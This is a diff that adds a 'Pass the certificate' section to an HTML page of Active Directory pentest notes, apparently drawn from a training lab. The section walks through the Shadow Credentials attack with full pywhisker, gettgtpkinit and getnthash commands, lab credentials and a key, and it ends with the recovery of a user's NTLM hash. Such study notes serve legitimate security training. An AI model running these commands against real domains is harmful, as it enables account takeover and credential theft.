@@ -273,6 +273,23 @@ Enter-PSSession -ComputerName DC01</code></pre>
                         </ul>
                     </ul>
                 </div>
+
+                 <div class="notion-body">
+                    <h2 id="Pass the certificate">Pass the certificate</h2>
+                        <h3> Shadow Credentials (msDS-KeyCredentialLink) </h3>
+                        <ul>
+                            <p>In case you found using bloodhound that your user has the <b>AddKeyCredentialLink</b> over another user you could take onwership of that user</p>
+                            <p>Use pywhisker to generate a certificate over the user. Grab the certificate file and the password</p>
+                            <pre><code class="language-powershell">python3 pywhisker.py --dc-ip 10.129.234.174 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add</code></pre>
+                            <p>Then using the data provided generate a ticket </p>
+                            <pre><code class="language-powershell">python3 gettgtpkinit.py -cert-pfx ../pywhisker/pywhisker/i6ChEVHa.pfx  -pfx-pass 'WH96w3A9GcadMlIQXssu' -dc-ip 10.129.234.174 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache</code></pre>
+                            <p>Export the ticket file</p>
+                            <pre><code class="language-powershell">export KRB5CCNAME=/tmp/jpinkman.ccache</code></pre>
+                            <p>Finally get the NTLM hash of the user using the AS-REP encrytion key found later</p>
+                            <pre><code class="language-powershell">python3 getnthash.py -key 9bc7b2f5fa26ddbaa206c4dbcd367fced55f31a928c517741aced8d922924d76 INLANEFREIGHT.LOCAL/jpinkman</code></pre>
+                        </ul>
+                </div>
+
         </div>
     </div>
 </body>
